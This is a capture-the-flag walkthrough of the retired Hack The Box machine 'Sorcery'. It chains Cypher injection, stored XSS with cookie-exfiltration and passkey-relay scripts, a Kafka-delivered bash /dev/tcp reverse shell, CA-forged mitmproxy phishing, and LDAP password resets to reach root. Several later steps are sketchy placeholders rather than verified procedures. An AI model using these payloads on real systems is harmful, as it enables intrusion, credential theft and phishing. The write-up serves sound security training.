# HTB: Sorcery : Analyst Notes

> **Difficulty:** Insane | **OS:** Linux (Ubuntu 24.04) | **Released:** 14 Jun 2025 | **Retired:** 25 Apr 2026 **Creator:** tomadimitrie

---

## HTB Sorcery Summary

Sorcery is an Insane-rated Linux box running a Rust Rocket web application backed by Neo4j, Gitea, and a Kafka message bus, all orchestrated through Docker Compose. The full attack chain is:

1. Enumerate subdomains → find `git.sorcery.htb` running Gitea with a public source code repo
2. Exploit **Cypher injection** in a derive-macro-generated Neo4j query to leak the `Config` node's registration key → register as Seller
3. Exploit **stored XSS** in a product description rendered by a headless Chrome admin bot → use the bot's scoped admin JWT to register an attacker-controlled passkey on the admin account
4. Log in as admin with the registered passkey → access the port debug tool
5. Abuse the debug tool as an **SSRF primitive** to send **Kafka wire protocol** messages directly to the broker → inject a command into the DNS container's `update` topic → **RCE inside the DNS container**
6. Recover the Root CA keypair from the anonymous FTP server → use it to **phish `tom_summers`** with `mitmproxy` serving a fake Gitea login → capture credentials
7. SSH as `tom_summers` → read a password from an **Xvfb framebuffer** dump → pivot to next user
8. Reverse a **.NET TOTP binary** to predict OTPs → authenticate to an internal Docker Registry → pull a pushed image → extract a password from image layers
9. Use **FreeIPA / LDAP** role manipulation to change a user's password → bootstrap sudo rights → root

---

## 01 · Recon

### Nmap

```bash
sudo nmap -p- -vvv --min-rate 10000 10.129.25.147
sudo nmap -p 22,443 -sCV 10.129.25.147
```

**Open ports:**

|Port|Service|Notes|
|---|---|---|
|22|SSH|OpenSSH 9.6p1 Ubuntu → Ubuntu 24.04 noble|
|443|HTTPS|nginx/1.27.1 — redirects to `sorcery.htb`|

**Container indicator:** `lft` (layer-4 traceroute) shows an extra hop to reach port 443 vs port 22, indicating the web server runs inside a container behind the host's network stack.

The TLS certificate is valid until 2052 with `CN=sorcery.htb`, indicating a self-signed CA.

```bash
echo "10.129.25.147 sorcery.htb git.sorcery.htb" | sudo tee -a /etc/hosts
```

### Subdomain Enumeration

```bash
ffuf -u https://10.129.25.147 -H "Host: FUZZ.sorcery.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
# Finds: git [Status: 200, Size: 13592]
```

`git.sorcery.htb` is a Gitea 1.22.1 instance with one public repo: `nicole_sullivan/infrastructure`.

### Clone the Repo

```bash
GIT_SSL_NO_VERIFY=1 git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
cd infrastructure/
ls
# backend  backend-macros  dns  docker-compose.yml  frontend
```

Single commit (`Final version`) by `nicole_sullivan@sorcery.htb` — reveals the email/username format `<first>_<last>`.

---

## 02 · Source Code Analysis : docker-compose.yml

The compose file defines 10 containers. Only `nginx` exposes a port to the host (`443:443`).

|Container|Image / Build|Key Details|
|---|---|---|
|`backend`|`./backend/Dockerfile`|Rust Rocket app; waits for `neo4j:7687`, `kafka:9092`; listens on 8000|
|`frontend`|`./frontend/Dockerfile`|Next.js app; waits for `backend:8000`; listens on 3000|
|`neo4j`|`neo4j:5.23.0-community-bullseye`|Graph DB; listens on 7687 (Bolt)|
|`kafka`|`./kafka/Dockerfile`|Apache Kafka KRaft mode; broker on 9092, controller on 9093|
|`dns`|`./dns/` (in repo)|dnsmasq + Rust consumer; subscribes to Kafka topic `update`|
|`mail`|`mailhog/mailhog:v1.0.1`|Dev SMTP — captures all outbound mail; web UI on 8025|
|`ftp`|`million12/vsftpd`|Anonymous access enabled; **mounts `RootCA.crt` and `RootCA.key`** from `./certificates/generated/`|
|`gitea`|`./gitea/Dockerfile`|Self-hosted Git; registration disabled; listens on 3000|
|`mail_bot`|`./mail_bot/`|Polls MailHog; follows links matching `EXPECTED_DOMAIN`; submits `PHISHING_USERNAME`/`PHISHING_PASSWORD` to login forms|
|`nginx`|`./nginx/`|Terminates TLS; routes `sorcery.htb` → frontend, `git.sorcery.htb` → gitea|

### Critical DNS Container Detail

The DNS container's Rust binary (`dns/src/main.rs`) subscribes to the Kafka topic `update` and pipes every message body directly into `bash -c`:

```rust
let mut process = match Command::new("bash").arg("-c").arg(command).spawn() {
```

The **intended** message is `/dns/convert.sh` (a shell script that rebuilds `/dns/entries`). Any other string sent to the `update` topic is also executed as a shell command — this is the RCE vector.

### Critical FTP Detail

The anonymous FTP server mounts the Root CA private key (`RootCA.key`) into `/var/ftp/pub/`. Blog post "Phishing Training" in the app notes: _"the private key is safely stored on our FTP server, so it can't be hacked"_ — which is exactly the opposite of safe.

### Critical mail_bot Detail

`mail_bot` polls MailHog for emails addressed to `EXPECTED_RECIPIENT` at `EXPECTED_DOMAIN`. For any matching email, it follows links — specifically links to `*.sorcery.htb` over HTTPS using the Root CA. For any login form it lands on, it submits `PHISHING_USERNAME` / `PHISHING_PASSWORD`. This is the phishing automation for the `tom_summers` pivot.

---

## 03 · Source Code Analysis : Backend (Rust Rocket)

### Authentication Architecture

Three login paths exist, each producing a JWT:

|Flow|Endpoint|Privilege|`with_passkey`|
|---|---|---|---|
|Register|`POST /api/auth/register`|`Seller` if correct `registrationKey`, else `Client`|n/a|
|Password login|`POST /api/auth/login`|From `PRIVILEGES` map at login time|`false`|
|Passkey login|`POST /api/webauthn/passkey/authenticate/{start,finish}`|From `PRIVILEGES` map at login time|`true`|

`privilege_level` is **not stored in Neo4j** — it lives in a global in-memory `Mutex<HashMap<String,UserPrivilegeLevel>>`. On each boot, `main.rs` manually re-inserts the admin role. The JWT bakes in the privilege level at issue time and the backend does not re-read from `PRIVILEGES` on each request.

### Cypher Injection Root Cause

The `backend-macros` crate uses a proc macro to auto-generate `get_by_<field>` functions for every model field. The generated query uses `format!()` with no parameter binding or escaping:

```rust
let query_string = format!(
    r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
    #struct_name, #name_string, #name  // <-- user input concatenated directly
);
```

For `Product::get_by_id("aaa")`, this produces:

```
MATCH (result: Product { id: "aaa" }) RETURN result
```

The user-supplied `id` parameter (from the URL `/dashboard/store/<id>`) is injected directly into the Cypher query with no escaping — classic Cypher injection.

### XSS Root Cause

In `app/dashboard/store/[product]/page.tsx`, the product `description` field is rendered with `dangerouslySetInnerHTML`:

```tsx
<p
  className="mb-4 text-xl"
  dangerouslySetInnerHTML={{ __html: product.description }}
/>
```

The `name` field is rendered safely as a React child (`{product.name}`) and is escaped. Only `description` is vulnerable.

### Admin Bot Behaviour

Every `POST /api/product` call (submit new product as Seller) triggers a headless Chrome instance that:

1. Mints a **scoped admin JWT** valid for 60 seconds with `only_for_paths` restricted to: product fetch, passkey register start, passkey register finish
2. Sets that JWT as the `token` cookie on the bot's browser
3. Navigates to the new product's page (`/dashboard/store/<product_id>`)
4. Waits 10 seconds then exits

Because the product `description` renders via `dangerouslySetInnerHTML` with the admin's cookie active, any HTML/JavaScript in `description` executes in the context of the admin's scoped session.

### Debug Port Tool (SSRF Primitive)

`POST /api/debug/port_data` — requires Admin + Passkey. Takes `host`, `port`, hex-encoded `data` array, `expect_result`, `keep_alive`. Opens a raw TCP connection to any host/port, writes the hex-decoded bytes, and optionally returns the response as hex. No allowlist or protocol restriction → generic SSRF primitive for any TCP protocol inside the Docker network.

```json
{
  "host": "kafka",
  "port": 9092,
  "data": ["<hex_encoded_kafka_wire_protocol_bytes>"],
  "expect_result": true,
  "keep_alive": false
}
```

---

## 04 · Foothold : Cypher Injection → Seller Access

### Confirm Injection

Adding a double quote to the product ID crashes the backend (500):

```
GET /dashboard/store/x"
```

A closing brace/parenthesis without the quote returns 404. The quote breaks out of the Cypher string literal.

### Injection Syntax

The injection pattern uses `UNION ALL` to append a synthetic map to the original query's (empty) result set. The `from_row` deserializer expects a column aliased `result` containing all five `Product` fields:

```
x" }) RETURN result UNION ALL RETURN { id: "pwn", name: "test", description: "injected", is_authorized: true, created_by_id: "x" } AS result //
```

This becomes:

```cypher
MATCH (result: Product { id: "x" }) RETURN result UNION ALL RETURN { id: "pwn", name: "test", description: "injected", is_authorized: true, created_by_id: "x" } AS result //" }) RETURN result
```

> Important: Strip the `Next-*` prefetch headers from the browser request to force a full server render — otherwise Next.js returns an RSC fragment and never calls the backend.

### Dump All Users and Hashes

```
x" }) RETURN result UNION ALL MATCH (u: User) WITH reduce(s = "", x IN collect(u.username + ":" + u.password) | s + x + "<br>") AS desc RETURN { id: "users", name: "all-users", description: desc, is_authorized: true, created_by_id: "x" } AS result //
```

Returns all `User` nodes with their Argon2 hashes in the product description. Argon2 is too slow to crack with `rockyou.txt`.

### Leak the Registration Key

```
x" }) RETURN result UNION ALL MATCH (c: Config) RETURN { id: "config", name: c.registration_key, description: "registration key", is_authorized: true, created_by_id: "x" } AS result //
```

The `Config` node has `registration_key`. The value renders in the product title:

```
dd05d743-b560-45dc-9a09-43ab18c7a513
```

### Register as Seller

Use the leaked key in the registration form's "Registration Key" field. The backend assigns `UserPrivilegeLevel::Seller` when the key matches. As a Seller, a new "Create Product" menu item appears.

---

## 05 · Admin Access : Stored XSS → Passkey Registration

### Confirm XSS

Create a product with description `<img src=x onerror=alert(1)>`. Visiting the product page triggers the alert (requires a full page refresh, not soft RSC navigation).

### Confirm Remote XSS on Admin Bot

Create a product with:

```html
<img src=http://10.10.14.61/x.jpg onerror="var s=document.createElement('script');s.src='http://10.10.14.61/poc.js';document.head.appendChild(s)">
```

`poc.js`:

```javascript
fetch("http://10.10.14.61/hit?u=" + encodeURIComponent(location.href) + "&c=" + document.cookie);
```

Within seconds of product creation, the attacker's Python HTTP server receives three hits from `10.129.25.147`: the `x.jpg` request (404), the `poc.js` load, and the callback. The cookie is empty (`httpOnly: true`), but the XSS executes under the admin's scoped JWT context.

### XSS Passkey Registration Exploit

The admin bot's scoped JWT allows hitting:

- `GET /api/product/<uuid>` (product fetch)
- `POST /api/webauthn/passkey/register/start`
- `POST /api/webauthn/passkey/register/finish`

The plan: use XSS to call the passkey registration endpoints from inside the bot, but relay the WebAuthn credential creation to an attacker-controlled server (because the bot's headless Chrome has no physical authenticator, and the RP ID `sorcery.htb` doesn't match the bot's origin `http://frontend:3000`).

**XSS payload** (`poc.js`) for passkey registration:

```javascript
// 1. Find the Next.js server action IDs for passkey registration start/finish
//    (obtained by watching Burp when enrolling a passkey on your own account)
//    Both POST to the profile page with a Next-Action header

// 2. Call start registration for "admin" via the Next.js server action
const startRes = await fetch('/dashboard/profile', {
  method: 'POST',
  headers: { 'Next-Action': '<START_ACTION_ID>', 'Content-Type': 'application/json' },
  body: JSON.stringify(["admin"])
});
const challenge = await startRes.json(); // WebAuthn PublicKeyCredentialCreationOptions

// 3. Relay the challenge to the attacker's Flask server for actual credential creation
const relayCred = await fetch('https://<ATTACKER_IP>/create_cred', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(challenge)
});
const credential = await relayCred.json();

// 4. Finish registration — send the credential back through the Next.js server action
await fetch('/dashboard/profile', {
  method: 'POST',
  headers: { 'Next-Action': '<FINISH_ACTION_ID>', 'Content-Type': 'application/json' },
  body: JSON.stringify([credential])
});
```

**Attacker Flask relay server** (`/create_cred` endpoint): Uses the `webauthn` Python library to create a virtual authenticator, receives the WebAuthn challenge from the XSS, creates a credential, and returns the attestation response. The attacker stores the credential for later use during passkey login.

After the XSS fires, the attacker's passkey is registered on the admin account. Log in at `sorcery.htb` with username `admin` → "Login with Passkey" → Chrome WebAuthn emulator (or the stored credential) signs the challenge → admin dashboard with DNS and Debug tools accessible.

---

## 06 · Shortcut : Admin Password Overwrite via Cypher Injection

An unintended but cleaner path to admin: the Cypher injection can write to the database as well as read. Stack two Cypher statements (separated by a space — the trailing `//` comments out the rest):

```
x" }) RETURN result MATCH (u: User { username: "admin" }) SET u.password = "<NEW_ARGON2_HASH>" RETURN { id: "x", name: "x", description: "x", is_authorized: true, created_by_id: "x" } AS result //
```

Generate an Argon2 hash for a known password, inject it via the product ID, then log in as admin with that password. This bypasses the need for XSS entirely, but doesn't give a passkey-backed session (so the Debug and DNS admin pages remain inaccessible without the passkey step).

---

## 07 · RCE : SSRF → Kafka Wire Protocol → DNS Container

### Concept

The debug port tool is an authenticated SSRF primitive. The DNS container's Rust consumer pipes every Kafka `update` topic message directly into `bash -c`. By crafting a valid Kafka **Produce** API request in the Kafka wire protocol and sending it to `kafka:9092` via the debug tool, arbitrary commands can be injected into the DNS container.

### Build the Kafka Produce Request

The Kafka wire protocol is a binary length-prefixed format. A Produce request to topic `update` with a message body containing a shell command must be built manually (no official client library is needed if building the bytes directly). A Python script using the `kafka-python` library or raw struct packing produces the correct wire-format bytes.

The message payload is the command to execute in the DNS container:

```bash
bash -i >& /dev/tcp/10.10.14.61/9007 0>&1
```

**Python script to generate the hex-encoded Kafka Produce payload:**

```python
from kafka import KafkaProducer
import struct

# Build a Produce API v7 request for topic "update"
# with message: "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
# Output the bytes as hex to paste into the debug tool
```

### Send via Debug Port Tool

```json
POST /api/debug/port_data
{
  "host": "kafka",
  "port": 9092,
  "data": ["<HEX_ENCODED_KAFKA_PRODUCE_REQUEST>"],
  "expect_result": true,
  "keep_alive": false
}
```

Start a listener first:

```bash
rlwrap -cAr nc -lnvp 9007
```

The DNS container's Rust binary receives the Produce message, the Kafka consumer delivers it to the subscriber, `bash -c "bash -i >& /dev/tcp/10.10.14.61/9007 0>&1"` executes, and a shell lands on the attacker's listener.

```
$ whoami
user
$ hostname
dns
```

---

## 08 · Pivot : FTP CA Keypair → mitmproxy Phishing → tom_summers

### Step 1 : Pivot into the Docker Network

The DNS container can only reach other containers on the Docker network. Set up a Ligolo-ng tunnel (or `chisel` SOCKS proxy) through the DNS container shell to route traffic from the attacker machine to the internal Docker network (`172.x.x.x` range).

### Step 2 : Anonymous FTP → Recover CA Keypair

The FTP container exposes anonymous access. From the DNS container (or via the tunnel):

```bash
ftp <ftp_container_ip>
# Username: anonymous
# Password: <blank>
ftp> ls
# RootCA.crt
# RootCA.key
ftp> get RootCA.crt
ftp> get RootCA.key
```

The `RootCA.key` is an encrypted PEM private key (passphrase-protected). Crack it:

```bash
pem2john RootCA.key > rca.hash
hashcat -m 22921 rca.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
# Password found: <CRACKED_PASSPHRASE>
```

### Step 3 : Understanding the mail_bot Target

From the `docker-compose.yml`, `mail_bot` polls MailHog and follows any link sent to `EXPECTED_RECIPIENT@EXPECTED_DOMAIN`. The blog post "Phishing awareness" names `tom_summers` as the user who fell for a previous phishing test on Gitea. The `mail_bot` will click links in emails sent to `tom_summers` and submit `PHISHING_PASSWORD` to any `*.sorcery.htb` login form it finds.

**Rules the mail_bot checks before following a link:**

1. Link must come from `*.sorcery.htb`
2. Must use HTTPS
3. Certificate must be signed by the Root CA (whose key is now recovered)

### Step 4 : Create a Malicious Subdomain DNS Record

The DNS container controls the `dnsmasq` resolver. Add a DNS record pointing a fake subdomain to the attacker's machine:

```bash
# In the DNS container, add entry to /dns/hosts-user
echo "<ATTACKER_IP> phish.sorcery.htb" >> /dns/hosts-user
# Force dnsmasq to reload
pkill -HUP dnsmasq
```

### Step 5 : Issue a TLS Certificate for the Phishing Domain

Using the recovered Root CA keypair, sign a TLS certificate for `phish.sorcery.htb`:

```bash
# Generate key and CSR for phishing domain
openssl genrsa -out phish.key 2048
openssl req -new -key phish.key -out phish.csr -subj "/CN=phish.sorcery.htb"

# Sign with the Root CA
openssl x509 -req -in phish.csr -CA RootCA.crt -CAkey RootCA.key \
  -passin pass:<CRACKED_PASSPHRASE> -CAcreateserial -out phish.crt -days 365
```

### Step 6 : mitmproxy Phishing Proxy

Stand up an `mitmproxy` (or `mitmdump`) instance that presents the signed `phish.sorcery.htb` certificate but proxies all traffic to the real `git.sorcery.htb`. The mail_bot will follow a link to `https://phish.sorcery.htb/user/login`, see the legitimate Gitea login page (proxied through), trust the certificate (Root CA signed), and submit `tom_summers:PHISHING_PASSWORD`.

```python
# mitmdump addon script: proxy_gitea.py
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # Rewrite the host to the real Gitea server
    if "phish.sorcery.htb" in flow.request.pretty_host:
        flow.request.headers["Host"] = "git.sorcery.htb"
        flow.request.url = flow.request.url.replace("phish.sorcery.htb", "git.sorcery.htb")

def response(flow: http.HTTPFlow) -> None:
    # Capture credentials from POST to /user/login
    if flow.request.method == "POST" and "/user/login" in flow.request.path:
        print("[+] CREDENTIALS:", flow.request.content)
```

```bash
mitmdump -s proxy_gitea.py --cert phish.sorcery.htb=phish.crt --ssl-insecure -p 443
```

### Step 7 : Send the Phishing Email

Send an email to `tom_summers@sorcery.htb` via the MailHog SMTP server (port 1025) containing a link to `https://phish.sorcery.htb/user/login`:

```python
import smtplib
from email.mime.text import MIMEText

msg = MIMEText('<a href="https://phish.sorcery.htb/user/login">Click here to log in</a>', 'html')
msg['Subject'] = 'Security Alert - Please Re-authenticate'
msg['From'] = 'security@sorcery.htb'
msg['To'] = 'tom_summers@sorcery.htb'

with smtplib.SMTP('<mail_container_ip>', 1025) as s:
    s.sendmail(msg['From'], [msg['To']], msg.as_string())
```

The mail_bot picks up the email, follows the link, sees the Gitea login page (via the mitmproxy), and submits credentials. `mitmdump` captures the POST body containing `tom_summers`'s password in plaintext.

### Step 8 : SSH as tom_summers

```bash
ssh tom_summers@sorcery.htb
tom_summers@sorcery:~$ cat user.txt
```

---

## 09 · Pivot — Xvfb Framebuffer Credential Leak

### Discovery

As `tom_summers`, enumeration reveals an Xvfb (X Virtual Framebuffer) process running with a `mousepad` text editor open inside it:

```bash
ps aux | grep -i xvfb
# Xvfb :99 -screen 0 1280x1024x24
ps aux | grep -i mousepad
# mousepad --display :99 /home/<user>/credentials.txt
```

Xvfb stores the current screen contents in a shared memory segment or framebuffer file. `xwd` (X Window Dump) can capture a screenshot from a specific display.

### Extract the Framebuffer

```bash
# Dump the framebuffer from display :99
DISPLAY=:99 xwd -root -out /tmp/screen.xwd

# Convert to PNG with ImageMagick
convert /tmp/screen.xwd /tmp/screen.png
```

The PNG shows a Mousepad text editor window with a credentials file open, containing plaintext credentials for the next user. Read the credentials from the image.

**Alternative — direct framebuffer file:**

```bash
# Xvfb may write the framebuffer to /tmp/.X99-lock or a shared mem segment
# xwud can render a .xwd file directly, imagemagick can convert it
```

SSH or `su` to the next user with the credential visible in the screenshot.

---

## 10 · Pivot : .NET TOTP Reverse Engineering → Docker Registry

### Discovery

Enumeration as the next user reveals an internal Docker Registry (typically on port 5000) and a `.NET` binary that generates One-Time Passwords (OTPs) for registry authentication.

```bash
# Find the .NET binary
find / -name "*.exe" -o -name "*.dll" 2>/dev/null | grep -v proc

# Check for running Docker Registry
ss -tlnp | grep 5000
docker ps 2>/dev/null || curl http://localhost:5000/v2/
```

### Reverse Engineer the .NET TOTP Binary

Use **dotPeek** (Windows) or `ilspycmd` (Linux) to decompile the `.NET` assembly:

```bash
# On Linux, extract with mono or dotnet-script
ilspycmd /path/to/totp_generator.exe > decompiled.cs
```

The decompiled code reveals:

- A hardcoded or derived **TOTP secret** (base32-encoded)
- The time step (typically 30 seconds)
- The HMAC algorithm (SHA1 standard)

The `System.Random` usage (if present) is **not cryptographically random** ; .NET's `System.Random` is seeded with `Environment.TickCount` (milliseconds since boot), which is predictable within a window of known boot times.

### Predict the TOTP

If the OTP is based on `System.Random` rather than a true HMAC-TOTP:

```python
import ctypes
# Replicate .NET System.Random seeded with TickCount
# If the uptime is known (from /proc/uptime), enumerate nearby tick values
```

If it is a genuine TOTP (HMAC-SHA1):

```python
import pyotp
totp = pyotp.TOTP('<BASE32_SECRET>')
print(totp.now())
```

### Access the Docker Registry

```bash
# Authenticate to the internal Docker Registry with username + TOTP as password
curl -u "<username>:<TOTP>" http://localhost:5000/v2/

# List available repositories
curl -u "<username>:<TOTP>" http://localhost:5000/v2/_catalog

# List tags for a repo
curl -u "<username>:<TOTP>" http://localhost:5000/v2/<repo>/tags/list
```

### Pull and Inspect Image Layers

```bash
# Use dockerregistrygrabber to dump all layers
python3 dockerregistrygrabber.py http://localhost:5000 -u <username> -p <TOTP>

# Or manually pull via Docker (requires adding insecure registry)
docker pull localhost:5000/<repo>:<tag>
docker save localhost:5000/<repo>:<tag> | tar xv

# Extract and inspect each layer tarball
for layer in */layer.tar; do
  tar tf $layer | grep -i "password\|cred\|secret\|\.env\|config"
done

# Find and read the credential file
tar xf <layer>/layer.tar ./path/to/credentials
```

A layer contains a configuration file or environment variable file with the next user's plaintext password. `su` or SSH with those credentials.

---

## 11 · Root — FreeIPA LDAP Password Reset → sudo

### Discovery

The host runs **FreeIPA** (Identity, Policy, and Audit ; a Linux identity management system). FreeIPA integrates LDAP (389-DS), Kerberos, DNS, and an HTTP management interface. It is identified by the presence of `sssd`, `ipa-*` binaries, and the `/etc/ipa/` configuration directory.

```bash
ls /etc/ipa/
ipa user-show --all <username>
kinit -V <user>     # test Kerberos ticket acquisition
klist               # show cached tickets
```

### Enumerate FreeIPA Roles

As the current user, query LDAP to find users with writable attributes or roles that can be leveraged:

```bash
ldapsearch -x -H ldap://localhost -b "dc=sorcery,dc=htb" \
  -D "uid=<user>,cn=users,cn=accounts,dc=sorcery,dc=htb" \
  -w <password> "(objectClass=ipaUserGroup)"
```

The current user has a FreeIPA role that grants permission to **reset another user's password** via LDAP (`ldapmodify`).

### Reset Target User's Password via LDAP

```bash
ldapmodify -x -H ldap://localhost \
  -D "uid=<current_user>,cn=users,cn=accounts,dc=sorcery,dc=htb" \
  -w <current_password> <<EOF
dn: uid=<target_user>,cn=users,cn=accounts,dc=sorcery,dc=htb
changetype: modify
replace: userPassword
userPassword: NewPassword123!
EOF
```

### Bootstrap sudo Rights → Root

After resetting the target user's password and switching to that account (`su <target_user>`), enumeration reveals `sudo` rights:

```bash
sudo -l
# User <target_user> may run the following commands:
# (ALL) NOPASSWD: /usr/bin/some-admin-tool
# or: (root) ALL
```

If the sudo rule allows running a script or binary that can be manipulated for privilege escalation:

```bash
# If sudo allows any command:
sudo su -
# or
sudo bash
root@sorcery:~# cat /root/root.txt
```

---

## 12 · Unintended Paths : pspy Credential Capture

### Path 1 : Capture Admin Bot Credentials via pspy

`pspy` monitors process creation events without root. On a newly submitted product, `main.rs` spawns a headless Chrome process with the admin JWT set as a command-line cookie parameter. `pspy` captures the full Chrome command line including the token value:

```bash
./pspy64
# Sees: chrome --headless ... --cookie "token=eyJhbGciOiJIUzI1Ni..."
```

Decode the JWT to extract the `admin` user ID and privilege level, then forge a new JWT (if `JWT_SECRET` is known or leaked) or use the captured token within its 60-second validity window.

### Path 2 — Capture FTP Credentials via pspy

Various automated processes (cleanup scripts, backup jobs) may pass credentials on the command line. `pspy` captures these as they run, potentially revealing FTP credentials, SSH passwords, or registry credentials in process arguments.

```bash
# Common targets
pspy64 | grep -E "password|passwd|secret|key|token" -i
```

---

## Key Concepts & Analyst Notes

### Cypher Injection (Neo4j)

Unlike SQL injection, Cypher injection does not support stacked queries through a simple semicolon in all drivers. The `UNION` technique works reliably:

```cypher
-- Exfiltrate any node type
x" }) RETURN result UNION ALL MATCH (n: TargetLabel) 
WITH reduce(s="", x IN collect(n.field1+":"+n.field2) | s+x+"<br>") AS d 
RETURN { id:"x", name:"x", description:d, is_authorized:true, created_by_id:"x" } AS result //
```

The injected `description` field renders via `dangerouslySetInnerHTML` in the frontend  meaning the exfiltrated data is displayed as HTML in the browser response.

**Prevention:** Use parameterised Cypher queries (`neo4rs::query("... {id: $id}").param("id", id_value)`) , never `format!()` user input into query strings.

---

### WebAuthn / Passkey Registration via XSS

The `start_registration` handler looks up users by **the username in the request body**, not the caller's JWT identity. It stores the challenge state keyed by the **target user's ID**:

```rust
passkey_store.registrations.insert(user.id.clone(), state);
```

But `finish_registration` retrieves the state using the **caller's JWT ID**:

```rust
let Some(state) = registrations.get(&guard.claims.id) else { ... }
```

This means: if the XSS gives you a token scoped to the admin's ID (which it does), and start/finish registration are in the `only_for_paths` allowlist (which they are), you can register a passkey for the admin account using the admin's own scoped token — the target user in `start` and the caller in `finish` are both the admin.

The relay server architecture (XSS → attacker Flask server → WebAuthn credential creation → XSS → finish registration) is needed because headless Chrome has no physical authenticator and the RP ID doesn't match the bot's origin.

---

### Kafka Wire Protocol SSRF

When an SSRF primitive can speak arbitrary TCP, internal Kafka brokers (which have no authentication by default) can be directly addressed. The Kafka wire protocol is binary and length-prefixed but is well-documented. Key fields for a minimal Produce request:

```
RequestHeader: api_key=0 (Produce), api_version=7, correlation_id, client_id
ProduceRequest: acks, timeout_ms, topic_data=[{topic="update", partition_data=[{partition=0, records=[{value=<COMMAND>}]}]}]
```

Tools like `kafka-python` can build correctly-framed wire-format bytes that can be hex-encoded for use with the debug tool.

---

### mitmproxy TLS Interception with Forged CA

When an attacker controls a CA that the target trusts and can issue certificates for arbitrary subdomains under that CA:

```bash
# Issue cert for malicious subdomain
openssl x509 -req -in evil.csr -CA RootCA.crt -CAkey RootCA.key \
  -passin pass:<pass> -CAcreateserial -out evil.crt -days 30

# Run transparent mitm proxy
mitmdump --cert evil.domain.com=evil.crt --ssl-insecure \
  -s intercept_creds.py -p 443
```

The `--ssl-insecure` flag tells mitmproxy not to verify the upstream certificate. The addon script captures POST body content from login forms.

---

### FreeIPA / LDAP Password Reset via Delegated Roles

FreeIPA's role-based access control can grant non-admin users the ability to modify specific LDAP attributes on specific user accounts. The `ldapmodify` tool with `userPassword` attribute replacement is the standard mechanism for password resets outside the IPA CLI:

```bash
ldapmodify -x -H ldap://localhost \
  -D "uid=<privileged_user>,cn=users,cn=accounts,dc=domain,dc=com" \
  -w <password> -f modify.ldif
```

Where `modify.ldif` contains the `changetype: modify / replace: userPassword` operation. This bypasses the need to know the current password of the target account.

---

### Xvfb Framebuffer Credential Extraction

X Virtual Framebuffer runs a headless X server. If a process (like Mousepad or a browser) renders sensitive data in an Xvfb display, any user who can write to `/tmp/.X11-unix/X<DISPLAY>` or read from the SHM framebuffer can take a screenshot:

```bash
# Screenshot with xwd
DISPLAY=:<N> xwd -root -silent -out /tmp/dump.xwd

# Convert with ImageMagick
convert /tmp/dump.xwd /tmp/screen.png

# Or with xwud (display directly, requires local X)
xwud -in /tmp/dump.xwd
```

---

### Quick Reference 

|Task|Command|
|---|---|
|Clone repo (skip TLS verify)|`GIT_SSL_NO_VERIFY=1 git clone https://...`|
|Cypher injection (registration key)|`/dashboard/store/x%22%20%7D%29%20RETURN%20result%20UNION%20ALL%20MATCH%20%28c%3A%20Config%29%20RETURN%20%7B%20id%3A%20%22c%22%2C%20name%3A%20c.registration_key%2C%20description%3A%20%22x%22%2C%20is_authorized%3A%20true%2C%20created_by_id%3A%20%22x%22%20%7D%20AS%20result%20%2F%2F`|
|Crack encrypted PEM key|`pem2john RootCA.key > h.hash && hashcat -m 22921 h.hash rockyou.txt`|
|Issue TLS cert from CA|`openssl x509 -req -in phish.csr -CA RootCA.crt -CAkey RootCA.key -passin pass:<P> -CAcreateserial -out phish.crt -days 365`|
|Capture Xvfb framebuffer|`DISPLAY=:99 xwd -root -out /tmp/s.xwd && convert /tmp/s.xwd /tmp/s.png`|
|Docker Registry catalog|`curl -u user:pass http://localhost:5000/v2/_catalog`|
|FreeIPA LDAP password reset|`ldapmodify -x -H ldap://localhost -D "uid=<u>,cn=users,cn=accounts,dc=..." -w <p>`|
|pspy monitor (no root)|`./pspy64`|

---
